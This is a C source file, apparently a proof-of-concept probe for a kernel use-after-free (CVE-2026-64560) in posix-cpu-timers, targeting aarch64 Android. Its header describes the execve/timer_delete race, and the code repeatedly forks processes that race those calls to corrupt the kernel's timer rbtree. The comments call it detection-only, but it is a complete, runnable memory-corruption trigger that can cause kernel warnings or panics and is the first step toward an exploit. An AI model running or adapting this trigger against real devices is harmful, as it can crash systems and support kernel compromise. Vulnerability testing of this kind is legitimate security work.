/*
 * cve64560_probe.c — minimal, offset-free trigger probe for CVE-2026-64560
 *
 * posix-cpu-timers: UAF caused by non-leader exec() race
 * Vulnerable: introduced 5.7, fixed in 6.18.41 (we run 6.18.21)
 *
 * Trigger shape (from the published analysis):
 *   thread A: timer_create(CLOCK_PROCESS_CPUTIME_ID) + timer_settime
 *   thread B: execve()            -> de_thread() -> release_task(old_leader)
 *                                    -> old_leader->sighand = NULL
 *   thread A: timer_delete()      -> posix_cpu_timer_del()
 *                                    -> lock_task_sighand() sees NULL
 *                                    -> returns 0 WITHOUT timerqueue_del()
 *   => k_itimer freed while its it.cpu.node stays linked in the rbtree
 *
 * The probe only DETECTS the race. It writes nothing to any partition and
 * exits after the requested rounds. A hit shows up as a kernel warning,
 * rbtree corruption message, or panic; a clean run proves nothing either way.
 *
 * Build (aarch64 static):
 *   zig cc -target aarch64-linux-musl -static -O2 -pthread \
 *          -o cve64560_probe cve64560_probe.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

/* aarch64 asm-generic: CLOCK_PROCESS_CPUTIME_ID == 2 */
#define CLK_PROC_CPU 2

static volatile int g_go;
static volatile int g_done;

static void *exec_worker(void *arg)
{
    while (!g_go) sched_yield();
    /* Any executable works; execve is what triggers de_thread(). We only
     * need it to actually run, so a real binary is required. */
    char *const argv[] = { (char *)"/system/bin/true", NULL };
    char *const envp[] = { NULL };
    execve(argv[0], argv, envp);
    /* Reaching here means exec failed; report so the parent can skip. */
    g_done = 1;
    return NULL;
}

static int one_attempt(void)
{
    struct sigevent ev;
    struct itimerspec its;
    timer_t tid;
    pthread_t th;

    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGUSR1;

    if (syscall(SYS_timer_create, CLK_PROC_CPU, &ev, &tid) != 0)
        return -1;

    memset(&its, 0, sizeof its);
    its.it_value.tv_nsec = 1000000;   /* 1 ms: arms the node on the rbtree */
    syscall(SYS_timer_settime, tid, 0, &its, NULL);

    g_go = 0;
    g_done = 0;
    if (pthread_create(&th, NULL, exec_worker, NULL) != 0) {
        syscall(SYS_timer_delete, tid);
        return -1;
    }
    g_go = 1;

    /* Race window: delete the timer while the worker is inside execve's
     * de_thread(). Repeat a few times to widen the chance of landing in
     * the window between __exit_signal() and lock_task_sighand(). */
    for (int k = 0; k < 3; k++) {
        syscall(SYS_timer_delete, tid);
        if (g_done) break;
    }

    /* If execve succeeded the thread is gone and this process is about to be
     * replaced; blocks briefly to let it happen. */
    for (int k = 0; k < 200 && !g_done; k++) usleep(50);

    return 0;
}

int main(int argc, char **argv)
{
    int rounds = (argc > 1) ? atoi(argv[1]) : 300;
    int par = (argc > 2) ? atoi(argv[2]) : 1;

    fprintf(stderr, "[probe] rounds=%d par=%d pid=%d\n", rounds, par, getpid());

    for (int i = 0; i < rounds; i++) {
        pid_t pids[16];
        int n = par > 16 ? 16 : par;
        for (int j = 0; j < n; j++) {
            pid_t p = fork();
            if (p == 0) {
                one_attempt();
                _exit(0);
            }
            pids[j] = p;
        }
        for (int j = 0; j < n; j++)
            if (pids[j] > 0) waitpid(pids[j], NULL, 0);

        if ((i % 25) == 0)
            fprintf(stderr, "[probe] round %d/%d alive\n", i, rounds);
    }

    fprintf(stderr, "[probe] completed without kernel fault\n");
    return 0;
}
